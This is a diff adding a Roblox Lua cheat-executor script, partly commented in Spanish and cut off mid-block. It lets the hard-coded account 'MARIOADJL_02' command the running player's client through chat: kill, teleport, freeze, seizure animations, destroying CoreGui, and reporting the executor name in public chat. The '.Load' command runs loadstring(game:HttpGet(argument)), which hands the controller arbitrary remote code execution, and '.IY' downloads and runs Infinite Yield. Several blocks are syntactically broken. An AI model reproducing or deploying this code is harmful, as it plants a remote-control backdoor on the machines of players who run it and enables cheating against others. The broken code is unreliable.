@@ -1,0 +1,1908 @@
+-- Define el nombre del jugador que queremos escuchar
+local targetPlayerName = "MARIOADJL_02"
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".Jump" then
+game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+    end
+end
+
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+
+-- 
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".Freeze" then
+game.Players.LocalPlayer.Character.Animate.Disabled = true
+game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+    end
+end
+
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- Función para manejar los mensajes del jugador
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".Respawn" then
+	 local old = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+ cf = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+ game.Players.LocalPlayer.Character.Humanoid.Health = 0
+ game.Players.LocalPlayer.CharacterAdded:wait(1); wait(0.2);
+	 game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = cf
+	 wait()
+	 game.Players.LocalPlayer.CharacterAdded:Wait()
+	 game.Players.LocalPlayer.Character:WaitForChild("HumanoidRootPart").CFrame = old
+    end
+end
+-- Conectar la función a cada jugador que entra al juego
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- Conectar la función a los jugadores que ya están en el juego
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- Función para manejar los mensajes del jugador
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".UnSeizure" then
+spawn(function()
+		 local Anim = Instance.new("Animation")
+		 if game.Players.LocalPlayer.Character:FindFirstChild("UpperTorso") then
+		 Anim.AnimationId = "rbxassetid://507767968"
+		 else
+			 Anim.AnimationId = "rbxassetid://180436148"
+			 end
+		 local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
+	  getgenv().ssss = game.Players.LocalPlayer:GetMouse()
+	  getgenv().Lzzz = true
+	  
+	  if Lzzz == false then
+	  getgenv().Lzzz = true
+		 if game.Players.LocalPlayer.Character:FindFirstChild("UpperTorso") then
+		 Anim.AnimationId = "rbxassetid://507767968"
+		 else
+			 Anim.AnimationId = "rbxassetid://180436148"
+			 end
+	  getgenv().currentnormal = game:GetService("Workspace").Gravity
+	  game:GetService("Workspace").Gravity = 196.2
+	  game:GetService("Players").LocalPlayer.Character:PivotTo(game:GetService("Players").LocalPlayer.Character:GetPivot() * CFrame.Angles(2, 0, 0))
+	  wait(0.5)
+	  game:GetService("Players").LocalPlayer.Character.Humanoid.PlatformStand = true
+	  game.Players.LocalPlayer.Character.Animate.Disabled = true
+	  
+		 k:Play()
+		 k:AdjustSpeed(10)
+		 
+	  game.Players.LocalPlayer.Character.Animate.Disabled = true
+		 else
+	  getgenv().Lzzz = false
+		 if game.Players.LocalPlayer.Character:FindFirstChild("UpperTorso") then
+		 Anim.AnimationId = "rbxassetid://507767968"
+		 else
+			 Anim.AnimationId = "rbxassetid://180436148"
+			 end
+	  game:GetService("Workspace").Gravity = currentnormal
+	  game:GetService("Players").LocalPlayer.Character.Humanoid.PlatformStand = false
+	  game:GetService("Players").LocalPlayer.Character.Humanoid.Jump = true
+		 k:Stop()
+	   
+	  game.Players.LocalPlayer.Character.Animate.Disabled = false
+	  game:GetService'RunService'.Heartbeat:Wait()
+	  for i = 1,10 do
+		  
+	  game.Players.LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+		 wait(0.1)
+		 end
+		  end
+	  game:GetService("RunService").RenderStepped:Connect(function()
+	  if Lzzz == true then
+				  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(.075*math.sin(45*tick()), .075*math.sin(45*tick()),.075*math.sin(45*tick())) --angle*math.sin(velocity*tick())
+	  end
+	  end)
+	  end)
+    end
+end
+-- Conectar la función a cada jugador que entra al juego
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- Conectar la función a los jugadores que ya están en el juego
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- Función para manejar los mensajes del jugador
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje empieza con ".jump"
+    if player.Name == targetPlayerName then
+        local command, argument = message:match("^(%.IY)%s*(.*)")
+        if command == ".IY" then
+local comandoexecute = argument
+			-- [[ thanks to homebrew devs for this ]] --
+			 if IYLOADED == false then
+				 local function copytable(tbl) local copy = {} for i,v in pairs(tbl) do copy[i] = v end return copy end
+				 local sandbox_env = copytable(getfenv())
+				 setmetatable(sandbox_env, {
+				 __index = function(self, i)
+					 if rawget(sandbox_env, i) then
+						 return rawget(sandbox_env, i)
+					 elseif getfenv()[i] then
+						 return getfenv()[i]
+					 end
+				 end
+				 })
+				 sandbox_env.game = nil
+				 iy, _ = game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"):gsub("local Main", "Main"):gsub("Players.LocalPlayer.Chatted","Funny = Players.LocalPlayer.Chatted"):gsub("local lastMessage","notify = _G.notify\nlocal lastMessage")
+				 setfenv(loadstring(iy),sandbox_env)()
+				 iy_cmds_table = sandbox_env.CMDs
+				 iy_gui = sandbox_env.Main
+				 iy_chathandler = sandbox_env.Funny
+				 execCmd = sandbox_env.execCmd
+				 iy_gui:Destroy()
+				 pcall(function()
+					 iy_chathandler:Disconnect()
+				 end)
+				 IYLOADED = true
+			 end
+			 execCmd((argument))
+        end
+    end
+end
+
+-- Conectar la función a cada jugador que entra al juego
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+
+-- Conectar la función a los jugadores que ya están en el juego
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- Función para manejar los mensajes del jugador
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".Follow" then
+FNSOAIAJKA = true
+game:GetService("RunService").Heartbeat:Wait()
+CBISUSBSJ = game:GetService("RunService").Heartbeat:Connect(function()
+if FNSOAIAJKA then
+				 local targetPos = game.Players.MARIOADJL_02.Character:FindFirstChild("Head").Position
+				 game.Players.LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid"):MoveTo(targetPos)
+end
+	 end)
+    end
+end
+-- Conectar la función a cada jugador que entra al juego
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- Conectar la función a los jugadores que ya están en el juego
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- Función para manejar los mensajes del jugador
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".UnFollow" then
+FNSOAIAJKA:Disconnect()
+CBISUSBSJ:Disconnect()
+    end
+end
+-- Conectar la función a cada jugador que entra al juego
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- Conectar la función a los jugadores que ya están en el juego
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- Función para manejar los mensajes del jugador
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".Seizure" then
+	 spawn(function()
+		 local Anim = Instance.new("Animation")
+		 if game.Players.LocalPlayer.Character:FindFirstChild("UpperTorso") then
+		 Anim.AnimationId = "rbxassetid://507767968"
+		 else
+			 Anim.AnimationId = "rbxassetid://180436148"
+			 end
+		 local k = game.Players.LocalPlayer.Character.Humanoid:LoadAnimation(Anim)
+	  getgenv().ssss = game.Players.LocalPlayer:GetMouse()
+	  getgenv().Lzzz = false
+	  
+	  if Lzzz == false then
+	  getgenv().Lzzz = false
+		 if game.Players.LocalPlayer.Character:FindFirstChild("UpperTorso") then
+		 Anim.AnimationId = "rbxassetid://507767968"
+		 else
+			 Anim.AnimationId = "rbxassetid://180436148"
+			 end
+	  getgenv().currentnormal = game:GetService("Workspace").Gravity
+	  game:GetService("Workspace").Gravity = 196.2
+	  game:GetService("Players").LocalPlayer.Character:PivotTo(game:GetService("Players").LocalPlayer.Character:GetPivot() * CFrame.Angles(2, 0, 0))
+	  wait(0.5)
+	  game:GetService("Players").LocalPlayer.Character.Humanoid.PlatformStand = true
+	  game.Players.LocalPlayer.Character.Animate.Disabled = true
+	  
+		 k:Play()
+		 k:AdjustSpeed(10)
+		 
+	  game.Players.LocalPlayer.Character.Animate.Disabled = true
+		 else
+	  getgenv().Lzzz = false
+		 if game.Players.LocalPlayer.Character:FindFirstChild("UpperTorso") then
+		 Anim.AnimationId = "rbxassetid://507767968"
+		 else
+			 Anim.AnimationId = "rbxassetid://180436148"
+			 end
+	  game:GetService("Workspace").Gravity = currentnormal
+	  game:GetService("Players").LocalPlayer.Character.Humanoid.PlatformStand = false
+	  game:GetService("Players").LocalPlayer.Character.Humanoid.Jump = true
+		 k:Stop()
+	   
+	  game.Players.LocalPlayer.Character.Animate.Disabled = false
+	  game:GetService'RunService'.Heartbeat:Wait()
+	  for i = 1,10 do
+		  
+	  game.Players.LocalPlayer.Character.HumanoidRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
+		 wait(0.1)
+		 end
+		  end
+	  game:GetService("RunService").RenderStepped:Connect(function()
+	  if Lzzz == true then
+				  game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(.075*math.sin(45*tick()), .075*math.sin(45*tick()),.075*math.sin(45*tick())) --angle*math.sin(velocity*tick())
+	  end
+	  end)
+	  end)
+    end
+end
+-- Conectar la función a cada jugador que entra al juego
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- Conectar la función a los jugadores que ya están en el juego
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".UnHeadStand" then
+game:GetService("Players").LocalPlayer.Character.Humanoid.PlatformStand = false
+game.Players.LocalPlayer.Character.Animate.Disabled = false
+		 bangLoop = bangLoop:Disconnect()
+		 bang:Stop()
+		 bangAnim:Destroy()
+		 bangDied:Disconnect()
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".UnStand" then
+game:GetService("Players").LocalPlayer.Character.Humanoid.PlatformStand = false
+game.Players.LocalPlayer.Character.Animate.Disabled = false
+NXKSJSBKSKA = NXKSJSBKSKA:Disconnect()
+ WOFBSOQJA:Disconnect()
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".UnHeadStand" then
+game:GetService("Players").LocalPlayer.Character.Humanoid.PlatformStand = false
+headSit = headSit:Disconnect()
+ sitDied:Disconnect()
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".LoopBring" then
+        LoopTeleportTaegetUni = true
+ while LoopTeleportTaegetUni do
+   game:GetService("RunService").Heartbeat:Wait()
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.MARIOADJL_02.Character.HumanoidRootPart.CFrame
+   end
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".UnLoopBring" then
+LoopTeleportTaegetUni = false
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".HeadSit" then
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+
+-- Función para obtener el jugador por nombr
+
+-- Función para obtener la raíz del personaje
+local function getRoot(character)
+    return character:FindFirstChild("HumanoidRootPart")
+end
+
+local players = game.Players.MARIOADJL_02
+
+
+local sitLoop
+local headSit
+
+-- Evento para desconectar el loop al morir
+local humanoid = LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+if humanoid then
+    humanoid.Died:Connect(function()
+        if sitLoop then
+            sitLoop:Disconnect()
+        end
+    end)
+    humanoid.Sit = true
+end
+
+headSit = RunService.Heartbeat:Connect(function()
+    if Players:FindFirstChild(players.Name) and players.Character and getRoot(players.Character) and getRoot(LocalPlayer.Character) and humanoid.Sit then
+        getRoot(LocalPlayer.Character).CFrame = players.Character.HumanoidRootPart.CFrame * CFrame.Angles(0, math.rad(0), 0) * CFrame.new(0, 1.6, 0.4)
+    else
+        if headSit then
+            headSit:Disconnect()
+        end
+    end
+end)
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".Greet" then
+KFOXJSNSOJXBAJA = 
+ local oldcframe = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
+ WaveAnim = Instance.new("Animation")
+			 if (game:GetService"Players".LocalPlayer.Character:WaitForChild("Humanoid").RigType == Enum.HumanoidRigType.R15) then
+				 WaveAnim.AnimationId = "rbxassetid://507770239"
+			 else
+				 WaveAnim.AnimationId = "rbxassetid://128777973"
+			 end
+			 game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.MARIOADJL_02.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -3)
+			 local CharPos = game.Players.LocalPlayer.Character.PrimaryPart.Position
+					 local tpos = game.Players.MARIOADJL_02.Character:FindFirstChild("HumanoidRootPart").Position
+					 local TPos = Vector3.new(tpos.X,CharPos.Y,tpos.Z)
+					 local NewCFrame = CFrame.new(CharPos,TPos)
+					 Players.LocalPlayer.Character:SetPrimaryPartCFrame(NewCFrame)
+ wave = game.Players.LocalPlayer.Character:FindFirstChildOfClass('Humanoid'):LoadAnimation(WaveAnim)
+ wave:Play(-1, 5, -1)
+ wait(1.6)
+ wave:Stop()
+ game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = oldcframe
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".RemoveCoreGui" then
+local function eliminarTodoDeCoreGui()
+    local coreGui = game:GetService("CoreGui")
+    for _, objeto in ipairs(coreGui:GetChildren()) do
+        objeto:Destroy()
+    end
+end
+
+-- Llama a la función para eliminar los objetos
+eliminarTodoDeCoreGui()
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- Función para manejar los mensajes del jugador
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".CheckExecutor" then
+if game:GetService('TextChatService').ChatVersion == Enum.ChatVersion.LegacyChatService then
+game:GetService('ReplicatedStorage'):WaitForChild('DefaultChatSystemChatEvents'):WaitForChild('SayMessageRequest'):FireServer(""..identifyexecutor().."", 'All')
+        else
+game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(""..identifyexecutor().."")
+        end
+    end
+end
+-- Conectar la función a cada jugador que entra al juego
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- Conectar la función a los jugadores que ya están en el juego
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- Función para manejar los mensajes del jugador
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje empieza con ".jump"
+    if player.Name == targetPlayerName then
+        local command, argument = message:match("^(%.Load)%s*(.*)")
+        if command == ".Load" then
+loadstring(game:HttpGet(argument))()
+        end
+    end
+end
+
+-- Conectar la función a cada jugador que entra al juego
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+
+-- Conectar la función a los jugadores que ya están en el juego
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+
+-- Función para manejar los mensajes del jugador
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".CheckTime" then
+if game:GetService('TextChatService').ChatVersion == Enum.ChatVersion.LegacyChatService then
+game:GetService('ReplicatedStorage'):WaitForChild('DefaultChatSystemChatEvents'):WaitForChild('SayMessageRequest'):FireServer(""..math.floor(workspace.DistributedGameTime / 60 / 60).." Hour | "..math.floor(workspace.DistributedGameTime / 60) - (math.floor(workspace.DistributedGameTime / 60 / 60) * 60).." Minute | "..math.floor(workspace.DistributedGameTime) - (math.floor(workspace.DistributedGameTime / 60) * 60).." Second", 'All')
+        else
+game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync(""..math.floor(workspace.DistributedGameTime / 60 / 60).." Hour | "..math.floor(workspace.DistributedGameTime / 60) - (math.floor(workspace.DistributedGameTime / 60 / 60) * 60).." Minute | "..math.floor(workspace.DistributedGameTime) - (math.floor(workspace.DistributedGameTime / 60) * 60).." Second")
+        end
+    end
+end
+-- Conectar la función a cada jugador que entra al juego
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- Conectar la función a los jugadores que ya están en el juego
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- Función para manejar los mensajes del jugador
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".CheckPing" then
+if game:GetService('TextChatService').ChatVersion == Enum.ChatVersion.LegacyChatService then
+game:GetService('ReplicatedStorage'):WaitForChild('DefaultChatSystemChatEvents'):WaitForChild('SayMessageRequest'):FireServer("PING: "..game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString().."", 'All')
+        else
+game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("PING: "..game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString().."")
+        end
+    end
+end
+-- Conectar la función a cada jugador que entra al juego
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- Conectar la función a los jugadores que ya están en el juego
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- Función para manejar los mensajes del jugador
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".CheckFPS" then
+if game:GetService('TextChatService').ChatVersion == Enum.ChatVersion.LegacyChatService then
+game:GetService('ReplicatedStorage'):WaitForChild('DefaultChatSystemChatEvents'):WaitForChild('SayMessageRequest'):FireServer("FPS: "..math.floor(workspace:GetRealPhysicsFPS()).."", 'All')
+        else
+game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("FPS: "..math.floor(workspace:GetRealPhysicsFPS()).."")
+        end
+    end
+end
+-- Conectar la función a cada jugador que entra al juego
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- Conectar la función a los jugadores que ya están en el juego
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".CheckUser" then
+if game:GetService('TextChatService').ChatVersion == Enum.ChatVersion.LegacyChatService then
+game:GetService('ReplicatedStorage'):WaitForChild('DefaultChatSystemChatEvents'):WaitForChild('SayMessageRequest'):FireServer("Juanko User", 'All')
+        else
+game:GetService("TextChatService").TextChannels.RBXGeneral:SendAsync("Juanko User")
+        end
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".UnLoopFling" then
+Loopvoid = false
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".UnFreeze" then
+game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+game.Players.LocalPlayer.Character.Animate.Disabled = false
+    end
+end
+
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".Bring" then
+game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.MARIOADJL_02.Character.HumanoidRootPart.CFrame
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".Kill" then
+game.Players.LocalPlayer.Character.Humanoid.Health = 0
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".UnSpin" then
+function getRoot(char)
+		 local rootPart = char:FindFirstChild('HumanoidRootPart') or char:FindFirstChild('Torso') or char:FindFirstChild('UpperTorso')
+		 return rootPart
+	 end
+	 
+	 for i,v in pairs(getRoot(game.Players.LocalPlayer.Character):GetChildren()) do
+			 if v.Name == "Spinning" then
+				 v:Destroy()
+			 end
+		 end
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end
+
+
+-- INFORMACION RANDOM EZ
+local function onPlayerChatted(player, message)
+    -- Verifica si el jugador es el que estamos buscando y si el mensaje es ".jump"
+    if player.Name == targetPlayerName and message == ".LoopJump" then
+        QODIJDAKAKSNSKA = true
+ while QODIJDAKAKSNSKA do
+game.Players.LocalPlayer.Character.Humanoid:ChangeState(Enum.HumanoidStateType.Jumping)
+wait(.6) 
+   end
+    end
+end
+-- INFORMACION RANDOM EZ
+game.Players.PlayerAdded:Connect(function(player)
+    player.Chatted:Connect(function(message)
+        onPlayerChatted(player, message)
+    end)
+end)
+-- INFORMACION RANDOM EZ
+for _, player in ipairs(game.Players:GetPlayers()) do
+    player.Chatted:Connect(function(message)
